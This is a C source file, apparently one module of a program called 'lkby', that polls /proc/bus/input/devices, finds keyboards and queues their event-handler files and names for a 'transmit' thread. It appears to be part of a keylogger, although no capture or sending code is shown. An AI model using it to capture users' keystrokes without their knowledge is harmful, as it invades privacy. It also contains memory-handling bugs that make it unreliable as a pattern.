#include <stdio.h>
#include <pthread.h>
#include <semaphore.h> 
#include <unistd.h>
#include <string.h>
#include <malloc.h>

#include "lkby_discovery.h"
#include "lkby_queue.h"

#define RETRY 5 // seconds.
#define REDISCOVER 10 // seconds.

#define KEYBOARD_ID1 "12001f" // wireless keyboard, using reciever
#define KEYBOARD_ID2 "120013" // normal keyboard
#define KEYBOARD_ID3 "12001b" // bluetooth keyboard

#define KB_DEVICES_LOC "/proc/bus/input/devices"

#define IS_KEYBOARD(dev_id) \
    ((!strcmp(dev_id, KEYBOARD_ID1) || !strcmp(dev_id, KEYBOARD_ID2)) ||  !strcmp(dev_id, KEYBOARD_ID3))


static char *read_device(FILE *devices) 
{
    size_t init_size = 50;
    char *device = (char *) malloc(sizeof(char) * init_size);
    if (NULL == device) return NULL;

    char curr_ch = ' ';
    size_t curr_size = 0;
    while (1) {
        curr_ch = fgetc(devices);
        if (EOF == curr_ch) break;
        if ('\n' == curr_ch && '\n' == device[curr_size - 1]) break;
        // build the device.
        device[curr_size++] = curr_ch;

        if (curr_size >= init_size) {
            init_size += init_size;
            device = (char *) realloc(device, sizeof(char) * init_size);
            if (NULL == device) return NULL;
        }
    }
    if (curr_size > 0) {
        device[curr_size - 1] = '\0'; // termination character.
    }
    if (0 == curr_size && EOF == curr_ch) {
        free(device);
        return NULL;
    }
    return (char *) realloc(device, sizeof(char) * curr_size);
}

/**
 * This function check if the @device is a keyboard 
 * or not.
 *
 * @param device The device to check.
 * @returns a pointer to the eventX file if the device is keyboard or NULL otherwise.
 */
static char *identified_keyboard(const char *device) 
{
    char *ev_loc = strstr(device, "EV=");
    if (NULL == ev_loc) return NULL;

    char *ev = NULL;
    int len;
    if (NULL == ev_loc) return 0;

    // skipi EV=
    ev_loc += 3;
    len = 0;
    while (*(ev_loc + len++) != '\n');

    ev = (char *) malloc(sizeof(char) * (len + 1));
    if (NULL == ev) return NULL;
    (void)memcpy(ev, ev_loc, len);
    ev[len - 1] = '\0';

    if (IS_KEYBOARD(ev)) {
        free(ev);
        ev_loc = strstr(device, "Handlers=");
        if (NULL == ev_loc) return NULL;
        ev_loc = strstr(ev_loc, "event");
        if (NULL == ev_loc) return NULL;

        len = 0;
        while (*(ev_loc + len++) != '\n');
        ev = (char *) malloc(sizeof(char) * (len + 1));
        if (NULL == ev) return NULL;
        (void)memcpy(ev, ev_loc, len);
        ev[len - 1] = '\0';
        return ev;
    }

    free(ev);
    return NULL;
}
 
static char *retrieve_keyboard_name(const char *device) 
{
    char *name_loc = strstr(device, "Name=");
    if (NULL == name_loc) return NULL;
    char *name = NULL;
    int len = 0;

    // skip name and the first "
    name_loc += 6;
    while (*(name_loc + len++) != '\n');
    name = (char *) malloc(sizeof(char) * (len - 1));
    if (NULL == name) return NULL;
    (void)memcpy(name, name_loc, len - 2); // skip the last "
    name[len - 2] = '\0';

    return name;
}

/**
 * This function stores the informations about the 
 * discovered keyboard into the queue of the scheduler
 * thread.
 */
static inline void store_kb_to_transmit_queue(const char *kb_event, const char *kb_name) 
{
    // build the data.
    union lkby_info kb_transmit_info;
    // store the information needed to schedule the keyboard.
    LKBY_INFO_KEYBOARD_NAME(&kb_transmit_info, lkby_keyboard) = (char *) kb_name;
    LKBY_INFO_KEYBOARD_EVENT(&kb_transmit_info)               = (char *) kb_event; 

    // add the new schedule info into the queue.
    lkbyqueue_enqueue(&LKBYQUEUE(&g_transmit_queue), &kb_transmit_info);
    // inform the scheduler thread that there is a new keyboard.
    (void)sem_post(&LKBYQUEUE_SEM(&g_transmit_queue));
}

static void read_keyboards(FILE *devices)
{
    char *dev      = NULL;
    char *kb_event = NULL;
    char *kb_name  = NULL;
    while ((dev = read_device(devices)) != NULL) {
        // todo - guard close
        if ((kb_event = identified_keyboard(dev)) != NULL) {
            if (NULL == (kb_name = retrieve_keyboard_name(dev))) {
                free(kb_event);
                free(dev);
                dev = NULL;
                continue;
            }
            store_kb_to_transmit_queue((const char *) kb_event, 
                                       (const char *) kb_name);
        }
        free(dev);
    }
}

void *lkby_start_discovery(void *none)
{
    FILE *devices; // pointer to the device file. 

    // start the keyboard identification process
    while(1) {
        devices = fopen(KB_DEVICES_LOC, "r");
        if (NULL == devices) {
            (void)sleep(RETRY);
            continue;
        }
        read_keyboards(devices);
        (void)fclose(devices);
        (void)sleep(REDISCOVER);
    }

    return NULL;
}
